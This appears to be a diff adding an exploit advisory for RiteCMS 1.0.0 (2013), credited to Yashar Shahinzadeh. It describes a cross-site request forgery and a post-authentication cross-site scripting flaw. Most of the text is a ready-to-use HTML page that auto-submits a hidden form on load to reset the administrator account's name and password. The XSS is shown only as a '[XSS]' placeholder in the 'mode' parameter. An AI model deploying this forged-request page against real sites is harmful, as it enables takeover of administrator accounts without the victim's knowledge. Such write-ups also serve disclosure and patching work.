@@ -1,0 +1,39 @@
+###########################################################################################
+# Exploit Title: RiteCMS multiple vulnerabilities
+# Date: 2013 30 July
+# Exploit Author: Yashar shahinzadeh
+# Credit goes for: ha.cker.ir
+# Vendor Homepage: http://ritecms.com/
+# Tested on: Linux & Windows, PHP 5.2.9
+# Affected Version : 1.0.0
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir }
+###########################################################################################
+
+Summary:
+========
+1. CSRF - Change administrator's password
+2. Cross site scripting
+
+1. CSRF - Adding an admin account:
+==================================
+
+<html>
+<body onload="submitForm()">
+<form name="myForm" id="myForm"
+                action="http://[Path to RiteCMS]/cms/index.php" method="post">
+                <input type="hidden" name="mode" value="users">
+                <input type="hidden" name="id" value="1">
+                <input type="hidden" name="name" value="admin1">
+				<input type="hidden" name="new_pw" value="admin">
+				<input type="hidden" name="new_pw_r" value="admin">
+				<input type="hidden" name="type" value="1">
+				<input type="hidden" name="edit_user_submitted" value="%C2%A0OK%C2%A0">
+</form>
+<script type='text/javascript'>document.myForm.submit();</script>
+</html>
+
+
+2. Cross site scripting (After auth):
+=====================================
+http://localhost:80//ritecms.1.0.0.tinymce/cms/index.php?mode=[XSS]
